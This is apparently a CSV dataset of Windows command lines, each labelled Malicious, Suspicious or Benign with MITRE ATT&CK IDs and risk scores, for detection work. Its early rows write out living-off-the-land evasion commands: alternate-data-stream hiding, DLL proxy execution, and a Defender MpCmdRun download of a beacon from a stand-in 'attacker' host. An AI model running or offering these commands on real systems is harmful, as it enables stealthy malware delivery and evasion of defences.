print /D:C:\ADS\File.txt:file.exe C:\ADS\File.exe,Writes file via print to ADS — evasion method,No,Files,Rare,Local,No,ADS Delivery,Used in red team persistence,T1564.004,Hidden Files and ADS,0.75,Malicious
MpCmdRun.exe -DownloadFile -url https://attacker/beacon.exe -path c:\temp\nicefile.txt:evil.exe,Downloads directly into ADS using Defender binary,Yes,Files,Rare,Remote,Yes,ADS Loader,Known in sandbox bypass attempts,T1564.004,Hidden Files and ADS,1,Malicious
Tracker.exe /d .\calc.dll /c C:\Windows\write.exe,Loads DLL via Tracker — rare LOLBin execution,No,DLL,Rare,Local,No,DLL Sideload,Abused in stealthy toolkits,T1574.002,DLL Side-Loading,0.75,Malicious
extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe,Extracts archive to alternate data stream,Yes,Files,Rare,Local,No,ADS Payload Drop,Observed in weaponized payloads,T1564.004,Hidden Files and ADS,0.8,Malicious
Print /D:C:\ADS\CopyOfFile.exe C:\ADS\FileToCopy.exe,Uses print command to copy file — potential masquerade,No,Files,Rare,Local,No,File Masquerading,"Rare in the wild, but logged",T1036.003,Masquerading,0.75,Malicious
makecab \webdavserver\webdav\file.exe C:\Folder\file.cab,Compresses file from WebDAV share — staging method,Yes,Files,Rare,Remote,Yes,Remote Payload Delivery,Seen in red team payloads,T1105,Ingress Tool Transfer,1,Malicious
bginfo.exe bginfo.bgi /popup /nolicprompt,Executes config file for background tool — may hide payload,Yes,Executable,Rare,Local,No,Config-based Execution,Observed in payload injection,T1218,Signed Binary Proxy Execution,0.8,Malicious
pcalua.exe -a calc.exe,Launches binary via Compatibility Assistant,Yes,Executable,Rare,Local,No,UAC Bypass Vector,Used in evasive loaders,T1218,Signed Binary Proxy Execution,0.8,Malicious
regasm.exe AllTheThingsx64.dll,Registers .NET DLL — classic LOLBin method,Yes,DLL,Rare,Script,No,DLL Proxy Execution,Common among evasive payloads,T1218.009,Regsvr32/Regasm/Regsvcs,0.9,Malicious
forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe,Uses forfiles to launch calculator — scripting abuse,Yes,Executable,Rare,Script,No,Binary Proxy Execution,Seen in script-based attacks,T1202,Indirect Command Execution,0.9,Malicious
findstr /V /L W3AllLov3DonaldTrump c:\ADS\file.exe > c:\ADS\file.txt:file.exe,Writes filtered content to ADS — data hiding technique,No,Files,Rare,Script,No,Obfuscation via Redirection,Seen in stealth data exfil,T1564.004,Hidden Files and ADS,0.85,Malicious
tasklist /V,Lists running tasks with details — may indicate recon,No,System,Common,Script,No,System Discovery,Seen in audits,T1057,Process Discovery,0.35,Suspicious
sc query,Enumerates services — useful for recon or legit admin,No,Registry,Common,Script,No,Service Discovery,Neutral,T1007,Service Discovery,0.3,Suspicious
net use Z: \internal\public,Maps a network share — could be lateral movement prep,No,Network,Common,Local,Yes,Mount Remote Resource,Seen in pentests,T1021.002,SMB Admin Shares,0.4,Suspicious
powershell Get-ScheduledTask,Lists all scheduled tasks — common recon tool,No,Script,Common,Script,No,Schedule Enumeration,Used in recon,T1053.005,Scheduled Task,0.45,Suspicious
wmic logicaldisk get name,Queries drive volumes — could be discovery or system mapping,Yes,System,Common,Script,No,Drive Enumeration,"Low threat, but noisy",T1082,System Info Discovery,0.3,Suspicious
notepad.exe,Opens Notepad — basic app launch,No,Executable,Common,Local,No,None,Harmless,—,—,0,Benign
ipconfig /all,Displays IP config — routine IT/admin use,No,System,Common,Local,No,None,Common admin use,—,—,0.05,Benign
echo Hello World,Simple echo test — no threat,No,None,Common,Local,No,None,Harmless,—,—,0,Benign
whoami,Shows current user — typical in dev/ops,No,Identity,Common,Local,No,None,Basic check,—,—,0.1,Benign
dir C:\Users\Public,Lists files — basic file operation,No,Files,Common,Local,No,None,Routine,—,—,0.1,Benign
netstat -ano,Lists active network connections — could be recon or admin,No,Network,Common,Local,No,Network Discovery,Neutral,T1049,System Network Connections,0.3,Suspicious
reg query HKLM\SYSTEM\CurrentControlSet\Services,Enumerates registry keys for services,No,Registry,Common,Script,No,Persistence Recon,Used in audits or malware,T1012,Query Registry,0.4,Suspicious
wmic useraccount list full,Enumerates all user accounts — could be recon,Yes,Identity,Rare,Script,No,Account Enumeration,Seen in red team tools,T1087,Account Discovery,0.45,Suspicious
powershell Get-LocalGroupMember -Group Administrators,Lists admin group members — local recon,No,Identity,Rare,Script,No,Privilege Check,Could support escalation,T1069,Permission Group Discovery,0.4,Suspicious
systeminfo,"Gathers OS version, hostname, etc.",No,System,Common,Local,No,Recon,Used in both admin & APTs,T1082,System Information Discovery,0.3,Suspicious
whoami /all,Lists user privileges — can be misused,No,Identity,Common,Local,No,Privilege Recon,Dual-use command,T1033,Security Context,0.3,Suspicious
"powershell ""Get-WmiObject -Class Win32_Product""",Queries installed programs — can be inventory or discovery,No,System,Common,Script,No,Recon Tool,Known in malware staging,T1518.001,Software Discovery,0.4,Suspicious
schtasks /query /fo LIST /v,Lists all scheduled tasks — potentially lateral prep,Yes,Schedule,Common,Script,No,Task Discovery,Used in recon,T1053.005,Scheduled Task,0.35,Suspicious
query user,Checks logged-in users — can support lateral movement,No,Identity,Common,Local,No,Session Recon,Logged in red team ops,T1087.001,Local Account Discovery,0.35,Suspicious
"powershell ""Get-ItemProperty -Path Registry::...""",Reads specific registry paths — dual use,No,Registry,Common,Script,No,Configuration Check,May reveal persistence,T1012,Query Registry,0.4,Suspicious
cls,Clears the screen — harmless,No,None,Common,Local,No,None,Harmless,—,—,0,Benign
help,Displays built-in help — zero risk,No,None,Common,Local,No,None,Neutral,—,—,0,Benign
cd C:\Users\Public,Changes directory — common file operation,No,Files,Common,Local,No,None,Legit use,—,—,0.05,Benign
set,Lists environment variables — typically harmless,No,System,Common,Local,No,None,Scripting use,—,—,0.1,Benign
hostname,Returns current machine name,No,Identity,Common,Local,No,None,Normal use,—,—,0.05,Benign
copy con test.txt,Creates a text file from CLI input,No,Files,Common,Local,No,None,Harmless scripting,—,—,0.1,Benign
date /t,Displays current date — harmless,No,System,Common,Local,No,None,Info only,—,—,0,Benign
time /t,Displays time — harmless,No,System,Common,Local,No,None,Info only,—,—,0,Benign
type nul > log.txt,Creates empty file — safe usage,No,Files,Common,Local,No,None,Automation-related,—,—,0.05,Benign
notepad log.txt,Opens a text file in Notepad,No,Files,Common,Local,No,None,Normal usage,—,—,0.05,Benign
